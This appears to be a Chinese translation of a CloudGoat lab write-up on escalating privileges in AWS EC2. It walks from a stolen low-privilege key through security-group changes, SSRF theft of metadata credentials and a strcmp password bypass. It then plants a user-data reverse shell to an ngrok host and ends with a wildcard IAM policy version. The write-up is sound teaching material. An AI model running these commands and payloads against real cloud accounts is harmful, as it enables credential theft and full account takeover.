> 原文链接: https://www.anquanke.com//post/id/170516 


# CloudGoat云靶机 Part-1：AWS EC2提权详解


                                阅读量   
                                **156994**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者rzepsky，文章来源：medium.com
                                <br>原文地址：[https://medium.com/@rzepsky/playing-with-cloudgoat-part-1-hacking-aws-ec2-service-for-privilege-escalation-4c42cc83f9da](https://medium.com/@rzepsky/playing-with-cloudgoat-part-1-hacking-aws-ec2-service-for-privilege-escalation-4c42cc83f9da)

译文仅供参考，具体内容表达以及含义原文为准

[![](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)](https://p0.ssl.qhimg.com/dm/1024_575_/t01e57150d9f8db6936.jpg)

本文是“Playing with CloudGoat” 系列文章的第一篇，这个系列文章将介绍基于AWS服务错误配置进行攻击的方法。今天我将主要介绍[CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat#requirements)平台和攻击EC2服务的方法，下一篇文章将介绍其他服务的漏洞，如黑掉Lambda，绕过CloudTrail（日志记录）等。



## 关于CloudGoat的几句话

[![](https://p4.ssl.qhimg.com/t01cb9c3dfadf97c524.png)](https://p4.ssl.qhimg.com/t01cb9c3dfadf97c524.png)

在研究技术细节之前，我先稍微介绍一下CloudGoat。它的作者是这样描述它的：

> CloudGoat用来部署存在漏洞的AWS资源，旨在引导开发者安全地设置AWS，规避风险。实验者应该确保易受攻击的资源只允许特定的AWS用户接触。这里包括你设置的IP白名单等。

换句话说，CloudGoat是一个有许多漏洞的的可变的环境，例如 AWS EC2, Lamba, Lightsail, Glue等。环境设置很少的IAM用户和规则，并且存在监控系统，例如CloudTrail和GuardDuty。这样的设置帮助你可以在各种环境下实验。与其他漏洞实验平台（如[Vulnhub](https://www.vulnhub.com/)）不同，在CloudGoat上，你不但可以获取管理员权限，还可以真正地融入攻击者角色。你可以做这些事：
- 权限提升
- 绕过日志/监控系统
- 数据信息枚举
- 窃取数据
- 持久访问
- 破坏（删除环境）


## 建立CloudGoat环境

[CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat#requirements)环境地部署非常简便。在我建立时，唯一需要添加的是[terraform](https://www.terraform.io/)。感谢[Homebrew](https://brew.sh/)，`brew install terraform`可以快速的做到，可以启动CloudGoat。运行`start.sh`，在后面加上你的IP地址（你只希望只有你可以攻击它，对吧？），这样就可以启动CouldGoat。`start.sh`脚本使用默认的AWS CLI设置（`~/.aws/credentials`可以找到）配置所有服务。

[![](https://p3.ssl.qhimg.com/t0108fbedb9f72150ed.png)](https://p3.ssl.qhimg.com/t0108fbedb9f72150ed.png)



## 技术细节

完成CloudGoat部署后，你可以在它创建的的`credentials.txt`文件中找到访问密钥。这里我选取用户Bob。

> 在真实的攻击环境中，访问密钥非常容易获得，你可以在[Github](https://www.theregister.co.uk/2017/11/14/dxc_github_aws_keys_leaked/)上找到它，或者通过[SSRF](https://hackerone.com/reports/285380)攻击或者[其他的方式](https://www.reddit.com/r/aws/comments/69puzk/so_uh_my_aws_account_got_compromised/?st=jgsgh0ug&amp;sh=7ca0b2b1)窃取它。发挥你的想象力，想象一下Bob账户的密钥被盗取的场景。好的，密钥拿到了，那么下一步怎么做？万一Bob这个账户的权限非常低，会有任何威胁吗？

从文档中拿到了Bob账户的密钥后，你可以先查看权限。用[Nimbostratus](http://andresriancho.github.io/nimbostratus/)这个工具，你可以简单的完成：

[![](https://p4.ssl.qhimg.com/t013d6528e99a76128f.png)](https://p4.ssl.qhimg.com/t013d6528e99a76128f.png)

是否允许提权？用这个[脚本](https://github.com/RhinoSecurityLabs/Security-Research/blob/master/tools/aws-pentest-tools/aws_escalate.py):

[![](https://p4.ssl.qhimg.com/t019cc20c77633487c5.png)](https://p4.ssl.qhimg.com/t019cc20c77633487c5.png)

沃日，不允许？！继续挖掘。

Bob有一些关于EC2服务的权限，让我看看是否有正在运行的EC2实例。用下图中的命令可以轻松完成：

[![](https://p2.ssl.qhimg.com/t01a8dae96d391fa2ac.png)](https://p2.ssl.qhimg.com/t01a8dae96d391fa2ac.png)

好的，这里有正在运行的EC2实例。从结果中可以提取一些有用的信息。这里，记下`instance-id`,`PublicDnsName`还有该实例的Security Groups名称`cloudgoat_ec2_sg`.

在配置EC2实例时，用户可以指定一些命令，它们随着开机自动执行。让我看看在那里是否有可利用的东西：

[![](https://p2.ssl.qhimg.com/t01d22e036f38dc1370.png)](https://p2.ssl.qhimg.com/t01d22e036f38dc1370.png)

用户数据经Base64编码。解码后，得到以下内容：

```
#cloud-boothook
#!/bin/bash
yum update -y
yum install php -y
yum install httpd -y
mkdir -p /var/www/html
cd /var/www/html
rm -rf ./*
printf "&lt;?phpnif(isset($_POST['url'])) `{`n  if(strcmp($_POST['password'], '190621105371994221060126716') != 0) `{`n    echo 'Wrong password. You just need to find it!';n    die;n  `}`n  echo '&lt;pre&gt;';n  echo(file_get_contents($_POST['url']));n  echo '&lt;/pre&gt;';n  die;n`}`n?&gt;n&lt;html&gt;&lt;head&gt;&lt;title&gt;URL Fetcher&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method='POST'&gt;&lt;label for='url'&gt;Enter the password and a URL that you want to make a request to (ex: https://google.com/)&lt;/label&gt;&lt;br /&gt;&lt;input type='text' name='password' placeholder='Password' /&gt;&lt;input type='text' name='url' placeholder='URL' /&gt;&lt;br /&gt;&lt;input type='submit' value='Retrieve Contents' /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;" &gt; index.php
/usr/sbin/apachectl start
```

可以发现这个实例正在运行一些Web应用。使用该实例的公共DNS，尝试访问：

[![](https://p0.ssl.qhimg.com/t012e19d9f9037256a8.png)](https://p0.ssl.qhimg.com/t012e19d9f9037256a8.png)

Hmm… 无法访问 🙁 可能是因为Security Groups策略。用以下命令检查它：

```
aws ec2 describe-security-groups --profile bob
```

从输出中可以读到有三个Security Groups:
<li>
`cloudgoat_ec2_debug_sg` (控制端口：0–65535)</li>
<li>
`cloudgoat_lb_sg` (控制端口：80)</li>
<li>
`cloudgoat_ec2_sg` (控制端口：22)</li>
`cloudgoat_ec2_sg`的22端口是该EC2实例唯一设置开放的。如果我们分配了`cloudgoat_lb_sg` 或者 `cloudgoat_ec2_debug_sg`，那么就允许通过HTTP流量了。很幸运，Bob有这个权限`ec2:ModifyInstanceAttribute`。让我用它分配`cloudgoat_ec2_debug_sg`(GroupId: sg-07b7aa99f0067c524)：

```
aws ec2 modify-instance-attribute --instance-id i-0e47e1bcf0904eaf4 --groups sg-07b7aa99f0067c524 --profile bob
```

现在再去访问公共DNS，呈现的是可使用的Web应用程序了。页面源代码中展示了用户数据。在这里只要你能提供正确的密钥，这个程序就可以作为代理，查询一些数据。在云服务中，SSRF和XXE被视为最危险的漏洞，因为它们可以泄露最敏感的信息，例如[元数据](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)，它储存着实例中所有用户的访问密钥和会话令牌。让我们看看里面有什么有趣的东西。

[![](https://p4.ssl.qhimg.com/t01422b0a078300bccd.png)](https://p4.ssl.qhimg.com/t01422b0a078300bccd.png)

Yeah，现在我获取了实例配置文件的新密钥！请注意，****一旦您在其它实例使用它们，它会触发GuardDuty警报：****

[![](https://p1.ssl.qhimg.com/t019ddf8c03b3661c4a.png)](https://p1.ssl.qhimg.com/t019ddf8c03b3661c4a.png)

现在，我需要做的是用RCE漏洞建立一个反向代理shell。玩弄PHP诡计（[这里](https://www.owasp.org/images/6/6b/PHPMagicTricks-TypeJuggling.pdf)你可以学到），一个空数组返回`NULL`和`NULL == 0`。所以，不需要密钥也可以获取元数据：

[![](https://p4.ssl.qhimg.com/t01236551b3174f6fd1.png)](https://p4.ssl.qhimg.com/t01236551b3174f6fd1.png)

我肯定这个LFI漏洞可以导致RCE。然而，无论我如何尝试（RFI，注入访问日志和错误日志，`data://`包装），这些PHP代码都不能执行（如果你有办法getshell，请在评论处分享）。

时间有限，我决定用一种高调的方法。使用`ec2:ModifyInstanceAttribute`，把用户数据用shell覆盖掉。首先，我得暂停实例（的确很高调）：

[![](https://p2.ssl.qhimg.com/t01fbb425d8f63e1360.png)](https://p2.ssl.qhimg.com/t01fbb425d8f63e1360.png)

现在我得确保实例启用后会自动执行shell。不用创建或者下载文件，一条bash命令就可以getshell：

```
bash -i &gt;&amp; /dev/tcp/[my_ip]/[my_port] 0&gt;&amp;1
```

如果你用的是NAT上网方式，你得不到shell。别着急，任何问题都可以解决！使用[ngrok](https://ngrok.com/)将本地流量转发到公网IP。使用以下命令：`./ngrok tcp [my_port]`

```
#cloud-boothook
#!/bin/bash
yum update -y
yum install php -y
yum install httpd -y
mkdir -p /var/www/html
cd /var/www/html
rm -rf ./*
printf "&lt;?phpnif(isset($_POST['url'])) `{`n  if(strcmp($_POST['password'], '38732856813292286581372217649') != 0) `{`n    echo 'Wrong password. You just need to find it!';n    die;n  `}`n  echo '&lt;pre&gt;';n  echo(file_get_contents($_POST['url']));n  echo '&lt;/pre&gt;';n die;`}`n?&gt;n&lt;html&gt;&lt;head&gt;&lt;title&gt;URL Fetcher&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form method='POST'&gt;&lt;label for='url'&gt;Enter the password and a URL that you want to make a request to (ex: https://google.com/)&lt;/label&gt;&lt;br /&gt;&lt;input type='text' name='password' placeholder='Password' /&gt;&lt;input type='text' name='url' placeholder='URL' /&gt;&lt;br /&gt;&lt;input type='submit' value='Retrieve Contents' /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;" &gt; index.php
/usr/sbin/apachectl start
bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/15547 0&gt;&amp;1
```

Base64编码后，我开始替换元数据：

[![](https://p0.ssl.qhimg.com/t017fa84110402fea32.png)](https://p0.ssl.qhimg.com/t017fa84110402fea32.png)

完成之后，我可以重启实例，等待着shell上线：

[![](https://p2.ssl.qhimg.com/t019da907775942becd.png)](https://p2.ssl.qhimg.com/t019da907775942becd.png)

Uff… 做到了。现在，我可以用该实例的`ec2_role`做任何事情，而不用担心GuardDuty（检测系统）。然而，这个角色权限实在是太低了。让Bob去看看该`ec2_role`到底能干什么吧。三个简单的步骤：

a) 遵循的策略：

[![](https://p1.ssl.qhimg.com/t01deb24ac72762c73f.png)](https://p1.ssl.qhimg.com/t01deb24ac72762c73f.png)

b) 当前`ec2_ip_policy`版本：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t014161781285f36463.png)

c) 权限：

[![](https://p5.ssl.qhimg.com/t0195f6bb4009a003a3.png)](https://p5.ssl.qhimg.com/t0195f6bb4009a003a3.png)

Hell yeah! 我可以创建其他的策略，这意味着我可以覆盖`ec2_role`的策略。新策略设置为默认策略才生效。其他有趣的地方，你不需要权限`iam:SetDefaultPolicyVersion`就可以把它应用为默认策略`--set-as-default`。

用`echo`命令可以创建一个新的`escalated_policy.json`文件：

```
`{`
    "Version": "2012-10-17",
    "Statement": [
        `{`
            "Effect": "Allow",
            "Action": "*",
            "Resource": "*"
        `}`
    ]
`}`
```

然后创建一个新的`ec2_ip_policy`版本，并设为默认：

[![](https://p5.ssl.qhimg.com/t016a4d058d8ad4a58d.png)](https://p5.ssl.qhimg.com/t016a4d058d8ad4a58d.png)

`ec2_ip_policy`策略的内容：

[![](https://p1.ssl.qhimg.com/t0187b3aefd2916a37d.png)](https://p1.ssl.qhimg.com/t0187b3aefd2916a37d.png)

现在，`ec2_role`拥有最高权限，可以执行任意操作。

### <a class="reference-link" name="More"></a>More

对于低权限的Bob用户，可能存在漏洞可以将权限提升到管理员，这意味着我可以做任何事：创建/修改/删除用户，开展新进程（矿工喜欢[创建新实例](https://www.olindata.com/en/blog/2017/04/spending-100k-usd-45-days-amazon-web-services)）或者删除你的所有资源（[通常产生严重的后果](https://www.infoworld.com/article/2608076/data-center/murder-in-the-amazon-cloud.html)）。
